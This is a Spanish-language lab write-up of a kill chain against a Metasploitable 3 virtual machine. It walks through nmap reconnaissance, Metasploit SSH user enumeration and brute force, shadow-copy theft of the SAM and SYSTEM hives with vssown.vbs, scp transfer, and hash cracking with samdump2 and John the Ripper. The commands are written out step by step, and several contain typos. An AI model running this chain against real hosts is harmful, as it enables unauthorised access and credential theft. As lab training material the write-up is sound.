---
title: "Lab.02 - Kill Chains 1"
date: 2026-06-09
categories: [lab, setup]
tags: [kill Chains, SSH, metasploitable, kali]
---

#**KILL CHAIN 1: SSH Brute Force + Credential Dumping** 

##**Snapshot de Metasploitable 3**

Se guarda un punto de restauración de la máquina virtual para poder recuperar su estado original y repetir las pruebas cuando sea necesario.

![Im.1](/assets/tercer/Im.1.png)

##**ETAPA 1: Reconocimiento**

Se identifica la máquina objetivo dentro de la red y se recolecta información básica sobre su configuración.

##1.1. Verificación de la Red (Atacante/Víctima)

- En la VM de Kali Linux se ejecuta el comando **ip address show**, para visualizar la IP asignada a esta máquina virtual.
- En la VM de Mestasploitable se ejecuta el comando **ip config**, para visualizar la IP asignada a esta máquina virtual.

Resultado:
![Im.1.1](/assets/tercer/Im.1.1.png)
![Im.1.2](/assets/tercer/Im.1.2.png)

##1.2. Comando de Escaneo Inicial con Nmap
Con el fin de detectar los equipos activos en la red, se utilizó Nmap para ejecutar un escaneo que omite la resolución de dominios.

   sudo nmap -sn 10.0.2.15/24
   password: vagrant

Resultado:
![Im.2.2](/assets/tercer/Im.2.1.png)
![Im.2.2](/assets/tercer/Im.2.2.png)

##1.3. Escaneo agresivo:
Se realizó un escaneo agresivo con **Nmap** para identificar el sistema operativo, los servicios activos, sus versiones y otra información relevante del host objetivo, examinando además todos los puertos TCP disponibles.

Explicación previa:
  *-A* : Activa el modo agresivo en Nmap.
  *-p-* : Escanea todos los puertos (de 1 a 65535) en lugar de solo los más comunes.
  *10.0.2.15*: IP de la víctima (VM Metasploitable)

  sudo nmap -A -p- 10.0.2.15

Resultado:
![Im.3.1](/assets/TERCER/Im.3.1.png)
![Im.3.2](/assets/TERCER/Im.3.2.png)
![Im.3.3](/assets/TERCER/Im.3.3.png)
![Im.3.4](/assets/TERCER/Im.3.4.png)
![Im.3.5](/assets/TERCER/Im.3.5.png)
![Im.3.6](/assets/TERCER/Im.3.6.png)
![Im.3.7](/assets/TERCER/Im.3.7.png)


**Si bien es cierto que el anterior escaneo es agresivo**, para un pentesting más completo y metódico, podríamos también se podrían considerar **otros tipos de escaneos**, como:

### **A:Escaneo SYN (Stealth Scan):** 
Se utiliza para identificar rápidamente los puertos abiertos de un equipo sin establecer una conexión completa, lo que permite realizar el reconocimiento de manera más discreta y con menor probabilidad de ser detectado.

nmap -sS 10.0.2.15 

Resultado:
![Im.4.1](/assets/TERCER/Im.4.1.png)


### **B: Escaneo de UDP:** 
Permite identificar servicios que utilizan el protocolo UDP y que podrían representar posibles puntos de acceso o vulnerabilidades. Este análisis complementa el escaneo TCP y ayuda a obtener una visión más completa de los servicios disponibles en el equipo evaluado.

   nmap -sU 10.0.2.15

Resultado:
![Im.5.1](/assets/TERCER/Im.5.1.png)


### **C:Escaneo de Vulnerabilidades (con Scripts):**
Permite evaluar los servicios identificados en los puertos abiertos para detectar posibles vulnerabilidades conocidas. Para ello, se utilizan scripts de Nmap que realizan comprobaciones específicas sobre los servicios en ejecución, facilitando la identificación de fallos de seguridad que podrían ser aprovechados por un atacante.

nmap --script vuln -p80,445 10.0.2.15

Resultado:
![Im.6.1](/assets/TERCER/Im.6.1.png)

###D:Escaneos FIN, NULL o Xmas: 
on técnicas de reconocimiento que utilizan combinaciones especiales de flags TCP para identificar puertos abiertos de forma más discreta. Se emplean como alternativa al escaneo SYN cuando se busca evitar ciertas restricciones o mecanismos básicos de detección en la red.

   nmap -sF, -sN, -sX

Resultado:
![Im.7.1](/assets/TERCER/Im.7.1.png)
![Im.7.2](/assets/TERCER/Im.7.2.png)
![Im.7.3](/assets/TERCER/Im.7.3.png)
![Im.7.4](/assets/TERCER/Im.7.4.png)


## **1.4. Confirmación del Firewall**
Permite analizar la ruta seguida por los paquetes hacia el host objetivo e identificar posibles dispositivos de red intermedios, como routers o firewalls, que podrían estar filtrando o controlando el tráfico.

   traceroute ip,  es decir,  traceroute 10.0.2.15   
   
Resultado:
![Im.8.1](/assets/TERCER/Im.8.1.png)

## **ETAPA 2: Enumeración de servicios**

##2.1.Escaneo de servicio SSH
Permite identificar si el servicio SSH se encuentra activo en el puerto correspondiente, así como obtener información sobre la versión del software en ejecución para evaluar posibles vulnerabilidades o configuraciones inseguras.

Explicación:
-sV: Permite identificar los servicios activos y determinar la versión del software que se encuentra ejecutándose en los puertos abiertos.

   udo nmap -sV -p 22 10.0.2.15

Resultado:
![Im.9.1](/assets/TERCER/Im.9.1.png)

## **ETAPA 3:Acceso Inicial**

##**3.1. Descarga de diccionarios**

Diccionarios para el laboratorio:

- SecLists para Usernames
- Rockyou para Passwords

Diccionarios descargados:
![Im.10](/assets/TERCER/Im.10.png)

En Kali Linux enviar los diccionarios descargados a la ruta: **Downloads/diccionarios** descomprimir con **gzip -dk rockyou.txt.gz** y y luego se corrobora que contenga al usuario **vagrant**:

  (user㉿kali)-[~]
   $ cd Downloads/
  (user㉿kali)-[~/Downloads]
   $ cd diccionarios/
  (user㉿kali)-[~/Downloads/diccionarios]
   $ ls
  rockyou.txt.gz  top-usernames-shortlist.txt
  (user㉿kali)-[~/Downloads/diccionarios]
   $ gzip -dk rockyou.txt.gz
 
Resultado
![Im.10.1](/assets/TERCER/Im.10.1.png)

Luego nos aseguramos de que contenga el usuario vagrant.
Se garantiza que el password se encuentra en la lista de diccionarios.

Usuario vagrant con **cat rockyou.txt | grep vagrant**
![Im.10.2](/assets/TERCER/Im.10.2.png)

##**3.2. Enumeración de Usuarios con Metasploitable**

Se crean 2 entornos de trabajo, la terminal superior será de Linux y la terminal inferior será para invocar a Metasploitable, ya que en esa región se podrán leer los comandos propios de Metasploitable.

![Im.11.1](/assets/TERCER/Im.11.1.png)

Se inicia Metasploitable con "msfconsole -q". La carga se visualiza como "msf6>". Asimismo se tiene que cargar las herramientas de escaneo.

   (user㉿kali)-[~/Downloads/diccionarios]
    $ msfconsole -q
    msf6>

Resultado:
![Im.11.2](/assets/TERCER/Im.11.2.png)

Ahora el Atacante (Kali) envía "scripts" paquetes SSH de autenticación con una lista de usuarios a la víctima = "target (Metasploitable)" y este lo recibe. La víctima responde con un mensaje que permite que el Atacante pueda identificar si el usuario que se ha intentado es válido o no.

Explicación:
El módulo utiliza una herramienta de Metasploitable para formar/consultar paquetes "Malformed Packet". 

Ingresando "show options" se visualizan todas las opciones de configuración, es decir, para saber que es lo que se tiene que configurar. El módulo "ssh_enumusers" tiene parámetros que sirven para configurar el funcionamiento de ese módulo.

Se ingresa: 
 1.msf6>use auxiliary/scanner/ssh/ssh_enumusers
 2.msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options

Resultado
![Im.11.3](/assets/TERCER/Im.11.3.png) 

Se configura el párametro RHOST y se le asigna el valor IP de la máquina target. Luego se configura el archivo donde van a estar los usuarios y el nombre del diccionario:

Se ingresa: 
   1.msf6 auxiliary(scanner/ssh/ssh_anumusers)>set RHOSTS 10.0.2.15
   2.msf6 auxiliary(scanner/ssh/ssh_anumusers)>USER_FILE /home/user/Downloads/diccionarios/top-usernmaes-shortlist.txt
   3.msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
   4. msf6 auxiliary(scanner/ssh/ssh_anumusers)>run

Resultado
![Im.11.4](/assets/TERCER/Im.11.4.png)

Ejecutamos con "run" para enviar los archivos.

En el script de Metasploitable: se ha encontrado el potencial usuario 'vagrant', ahora se tiene que intentar conseguir el password adecuado para el usuario.

![Im.11.5](/assets/TERCER/Im.11.5.png)

##**3.3. Ataque de Fuerza Bruta en SSH**

Luego de haber encontrado un usuario válido, se utiliza un ataque de fuerza bruta obtener posibles contraseñas.

Para ello se ingresa el script 'ssh_login' en Metasploitable para las autenticaciones sobre el usuario encontrado 'vagrant' con sus potenciales passwords que se encontrarán listados en el archivo ''.
Recordar que tenemos que cambiar de módulo (modulo actual: ssh_enunusers) para realizar el 'login', con el comando 'use auxiliary/scanner/ssh/ssh_login'.

  1.msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
  2.msf6 auxiliary(scanner/ssh/ssh_login)>show options
  3.msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
  4.msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
  5.msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
  6.msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
  7.msf6 auxiliary(scanner/ssh/ssh_login)>show options
  8.msf6 auxiliary(scanner/ssh/ssh_login)>run

Se realiza el cambio de ruta y a través de 'show options' se observan las configuraciones principales como: 
- SET RHOSTS IP de la víctima: *10.0.2.15* 
- El username *vagrant*
- PASS_FILE: la ruta del archivo con las direcciones

Resultado:
![Im.12.1](/assets/TERCER/Im.12.1.png)
![Im.12.2](/assets/TERCER/Im.12.2.png)

Se ejecuta y empieza a  realizar la búsqueda del USERNAME 'vagrant':
![Im.12.3](/assets/TERCER/Im.12.3.png)

##**ETAPA 4: Explotación y Acceso**

##**4.1. CONEXIÓN SSH**
Ya obtenido el usuario y contraseña de la víctima (USERNAME: vagrant, CONTRASEÑA: vagrant), se procede a realizar la conexión SSH con la IP '10.0.2.15'. Sin embargo, para un mejor entorno de ejecución se ingresa al modo/terminal 'bash' de Metasploitable:

![Im.13.1](/assets/TERCER/Im.13.1.png)

##**ETAPA 5: Extracción de Archivos SAM y SYSTEM** 

##**5.1. Comprobación de los Privilegios**

Desde el lado del adversario (Metasploitable) es necesario comprobar los privilegios que se tienen a través, del comando: 'whoami /priv'.

*Si tenemos privilegios de administrador, deberíamos ver permisos como 'SeBackupPrivilege' y 'SeRestorePrivilege'.

*Ambos son importantes para hacer la copia de un archivo en específico y exfiltrarlo/sacarlo hacia afuera (Kali Linux). Asimismo, ambos permiten crear una copia del dico C.

   -sh-4.3$ bash
   C:\Users\vagrant>whoami
   C:\Users\vagrant>whoami /priv

Resultado:
![Im.13.2](/assets/TERCER/Im.13.2.png)

###**5.2. Localiza el Script vssown.vbs**

Antes de continuar, se debe comprobar que el script vssown.vbs se encuentre disponible en el sistema comprometido. Este script se utiliza para crear una copia de sombra (Volume Shadow Copy), lo que permite acceder a archivos protegidos por el sistema.

En caso de que el archivo no esté disponible, puede descargarse previamente desde Kali Linux a través de su repositorio oficial: https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vb

Luego en la terminal de Kali ingresar el comando siguiente e ingresar la contraseña: 'vagrant', para copiar un archivo del computador local hacia el objetivo remoto: 

   1. scp vssown.vbs vagrant@10.0.2.15:C:\\Users\\vagrant\\Downloads

*NOTA: La máquina víctima (Metasploitable) debe de estar encendida para que se realice la copia.

![Im.14.1](/assets/TERCER/Im.14.1.png)

Una manera de verificar la copia es ingresando y buscando en Windows la ruta de la copia de 'vssown'
 
    C:\\Users\\vagrant\\Downloads

![Im.14.2](/assets/TERCER/Im.14.2.png)

Se realiza la conexión vía ssh a 'ssh vagrant@10.0.2.15', se ingresa la contraseña 'vagrant' y se invoca al 'bash' para poder entrar a la terminal de Metasploitable.

![Im.14.3](/assets/TERCER/Im.14.3.png)

Una vez transferido, ingresar a la ruta del archivo y listar el archivo vssown.vbs para verificar que se encuentra en esta carpeta:

    ssh vagrant@10.0.2.15 
          -sh-4.3$ bash   #ingresar al terminal de Windows con 'bash'
    Users\vagrant>cd Downloads
    Users\vagrant\Downloads>ls
    ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs
    ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs

Resultado:
![14.4](/assets/tercer/14.4.png)

##**5.3. ¿Qué podemos hacer con el vssown.vbs?**
Para listar los comandos que el archivo vssown.vbs permite ejecutar, solo debemos ejecutar 'cscript vssown.vbs' en la máquina víctima (Metasploitable). Asimismo, los comandos que vamos a usar son:

/list                             - List current volume shadow copies.
/start                            - Start the shadow copy service.
/stop                             - Halt the shadow copy service.
/status                           - Show status of shadow copy service.

![14.5](/assets/tercer/14.5.png)

**¿QUÉ ES VOLUME SHADOW COPY - VSS?**
Volume Shadow Copy (VSS) es una función de Windows que crea copias de seguridad de archivos y carpetas en un momento específico, incluso cuando estos están siendo utilizados. Gracias a ello, es posible recuperar información eliminada, restaurar versiones anteriores de archivos o realizar copias de seguridad sin interrumpir el funcionamiento del sistema.

Usos principales:

- Recuperación de archivos perdidos o modificados.
- Creación de copias de seguridad.
- Auditoría y análisis de información del sistema.

##**5.4. EJECUCIÓN DEL SCRIPT VSSOWN.VBS**
Se inicia el servicio Volume Shadow Copy con el comando:

 1. cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /start

La salida indica que el comando se ejecutó correctamente. El mensaje importante es: [*] Signal sent to start the VSS service.

   2. cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /status

Indica que el servicio o proceso asociado a VSS que controla el script vssown.vbs se encuentra ejecutándose: [*] Running 

   3. cscript C:\\Users\\vagrant\\Downloads\\vssown.vbs /create c

El script está intentando crear una Shadow Copy (instantánea) de la unidad C:

![Im.14.6](/assets/TERCER/Im.14.6.png)

Se listan los volúmenes de shadows (vss) existentes:
![Im.14.7](/assets/TERCER/Im.14.7.png)

El script vssown.vbs generará una salida con la ubicación de la copia de sombra. De la imagen anterior se obtiene la ruta, esta será la ubicación donde podremos acceder a los archivos SAM y SYSTEM sin restricciones. En el comando anterior, la ruta es:

 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 

##**5.5. Copia los Archivos SAM y SYSTEM**

Ahora que tenemos la ruta de la copia del volumen shadow (vss), entrar en la terminal de Kali, para ello se debe de ingresar al ssh:

Líneas de comando:

    ssh vagrant@10.0.2.15 
          -sh-4.3$ cmd   #ingresar al terminal de Windows 
    C:\Users\vagrant>cd C:\Windows\Temp
    cd C:\Windows\Temp
    C:\Windows\Temp>

Y copiar los archivos SAM y SYSTEM del volumen shadow:
*SAM:
 cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM 

*SYSTEM:
cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

NOTA: Reemplazar HarddiskVolumeShadowCopyX con el número correspondiente que el script vssown.vbs nos indicó. En este caso 'HarddiskVolumeShadowCopy1'

Resultado:
![Im.14.8](/assets/TERCER/Im.14.8.png)
Salimos del modo cmd con 'exit'

##**ETAPA 6: Transferir los Archivos SAM y SYSTEM al atacante**

Previamente identificar la ruta real usando **scp** o descarga los archivos SAM y SYSTEM desde la máquina víctima a tu máquina atacante para realizar el análisis de los hashes de contraseñas. Para ello ingresar a la terminal de Kali, a la carpeta de descargas, con: 
 
   1. scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SAM .
   2. scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SYSTEM .

password: vagrant

Resultado:
![Im.14.9](/assets/TERCER/Im.14.9.png)

##**ETAPA 7. Extracción de Hashes**

** samdump2: Asimismo, permite extraer los hashes de las contraseñas almacenadas en Windows utilizando los archivos SYSTEM y SAM. El archivo SYSTEM contiene la información necesaria para descifrar los datos protegidos del archivo SAM (Security Account Manager), donde se almacenan los hashes de las cuentas de usuario.

En Kali:
   1. samdump2 SYSTEM SAM > hashes.txt
   2. samdump2 SYSTEM SAM 

**NOTA:** Para funcionar, samdump2 requiere dos archivos específicos del registro de Windows: el hive SYSTEM y el hive SAM. El archivo SYSTEM contiene la clave necesaria para descifrar la información almacenada en el archivo SAM (Security Account Manager), que es donde residen los hashes de las contraseñas de los usuarios.

Al ejecutar el comando samdump2 SYSTEM SAM > hashes.txt, la herramienta procesa ambos archivos, extrae los hashes y guarda el resultado en el archivo hashes.txt. Esta información puede utilizarse posteriormente para realizar análisis de seguridad o auditorías de contraseñas mediante herramientas especializadas.

Resultado:
![Im.15.1](/assets/TERCER/Im.15.1.png)


##**Reinicio de resultados de John the Ripper**
Se elimina el archivo ~/.john/john.pot, donde John the Ripper guarda las contraseñas encontradas. Esto permite que las credenciales recuperadas vuelvan a mostrarse durante una nueva ejecución del ataque.

    1 (user㉿kali)-[~/Downloads]
    2 $ rm ~/.john/john.pot  

**Crackeo de Hashes usando John the Ripper:
En esencia, este comando le ordena a la herramienta John the Ripper que realice un ataque de diccionario sobre una lista de hashes de contraseñas de Windows, utilizando 4 procesos para acelerar el trabajo.

    3 (user㉿kali)-[~/Downloads]
    4$ john --format=NT --wordlist=diccionarios/kaonashi14M.txt hashes.txt --fork=4
   
Resultado:
![Im.15.2](/assets/TERCER/15.2.png)

John the Ripper logró recuperar varias contraseñas a partir de los hashes NTLM contenidos en hashes.txt.

**NOTA:** El uso de John the Ripper junto con los diccionarios de contraseñas permitió recuperar varias credenciales almacenadas en los hashes extraídos previamente. Entre las cuentas comprometidas se evidencia el riesgo asociado al uso de contraseñas predecibles o incluidas en diccionarios conocidos.
